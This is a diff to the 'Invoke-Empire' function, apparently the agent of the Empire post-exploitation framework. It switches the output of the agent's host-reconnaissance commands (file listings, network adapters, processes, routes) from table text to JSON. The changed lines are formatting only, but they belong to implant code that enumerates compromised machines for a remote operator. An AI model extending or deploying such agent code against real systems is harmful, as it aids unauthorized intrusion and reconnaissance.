@@ -301,7 +301,7 @@ function Invoke-Empire {
             switch -regex ($cmd) {
                 '(ls|^dir)' {
                     if ($cmdargs.length -eq "") {
-                        $output = Get-ChildItem -force | select mode,@{Name="Owner";Expression={(Get-Acl $_.FullName).Owner }},lastwritetime,length,name
+                        $output = Get-ChildItem -force | select mode,@{Name="Owner";Expression={(Get-Acl $_.FullName).Owner }},@{Name="LastWriteTime";Expression={($_.LastWriteTime.ToString("u"))}},length,name
                     }
                     else {
                         try{
@@ -344,7 +344,7 @@ function Invoke-Empire {
                         $out | Add-Member Noteproperty 'DNSHostName' $_.DNSHostName
                         $out | Add-Member Noteproperty 'DNSSuffix' $($_.DNSDomainSuffixSearchOrder -join ",")
                         $out
-                    } | fl | Out-String | ForEach-Object {$_ + "`n"}
+                    }
                 }
                 # this is stupid how complicated it is to get this information...
                 '(ps|tasklist)' {
@@ -399,8 +399,7 @@ function Invoke-Empire {
                             }
                             $out | Add-Member Noteproperty 'Metric' $_.Metric1
                             $out
-                        } | ft -autosize | Out-String
-                        
+                        }
                     }
                     else { $output = route $cmdargs }
                 }
@@ -416,7 +415,7 @@ function Invoke-Empire {
                 }
             }
         }
-        "`n"+($output | Format-Table -wrap | Out-String)
+        "`n"+($output | ConvertTo-Json)
     }
 
     # takes a string representing a PowerShell script to run, build a new
